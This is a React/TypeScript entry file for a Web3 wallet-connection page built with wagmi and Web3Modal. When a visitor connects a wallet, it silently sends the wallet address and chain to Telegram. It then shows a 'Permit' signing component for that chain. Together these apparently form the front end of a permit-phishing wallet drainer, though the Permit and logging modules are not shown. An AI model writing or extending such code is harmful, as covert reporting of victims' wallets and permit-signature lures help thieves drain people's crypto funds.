import React, { useState, useEffect } from "react";
import ReactDOM from "react-dom/client";
import { createWeb3Modal, defaultWagmiConfig } from "@web3modal/wagmi/react";
import { WagmiConfig, useAccount, useNetwork } from "wagmi";
import { mainnet, polygon, optimism, arbitrum, Chain } from "wagmi/chains";


import Permit from "./permit";
import { logToTelegram } from "./log"; // Import logging function
import "./index.css";

const projectId = import.meta.env.VITE_APP_WALLET_CONNECT;

// Define the tBNB (Binance Smart Chain Testnet) custom chain
const tBNB: Chain = {
  id: 97, // BNB Chain Testnet ID
  name: 'BNB Smart Chain Testnet',
  network: 'bsc-testnet',
  nativeCurrency: {
    name: 'BNB',
    symbol: 'tBNB',
    decimals: 18,
  },
  rpcUrls: {
    default: {
      http: ['https://data-seed-prebsc-1-s1.binance.org:8545'], // Public RPC URL
    },
  },
  blockExplorers: {
    default: { name: 'BscScan', url: 'https://testnet.bscscan.com' },
  },
  testnet: true, // Indicating this is a testnet
};

// Include the custom tBNB chain along with other chains
const chains = [mainnet, polygon, optimism, arbitrum, tBNB];


const wagmiConfig = defaultWagmiConfig({
  chains,
  projectId,
  appName: "Web3Modal v3",
});

createWeb3Modal({ wagmiConfig, projectId, chains });

const App = () => {
  const { address } = useAccount();
  const { chain } = useNetwork();
  const [hasLogged, setHasLogged] = useState(false); // State to track if the log has been sent

  useEffect(() => {
    if (address && chain && !hasLogged) {
      const message = `Wallet connected: \nAddress: ${address} \nChain: ${chain.name}`;
      logToTelegram(message);
      setHasLogged(true); // Set the flag to true after logging
    }
  }, [address, chain, hasLogged]); // Adding hasLogged as a dependency

  return (
    <>
      <div className="container">
        <w3m-button />
        <w3m-network-button />
      </div>
      <p>
        {address && (
          <>
            <Permit chain={chain} />
          </>
        )}
      </p>
    </>
  );
};

ReactDOM.createRoot(document.getElementById("root") as HTMLElement).render(
  <React.StrictMode>
    <WagmiConfig config={wagmiConfig}>
      <App />
    </WagmiConfig>
  </React.StrictMode>
);
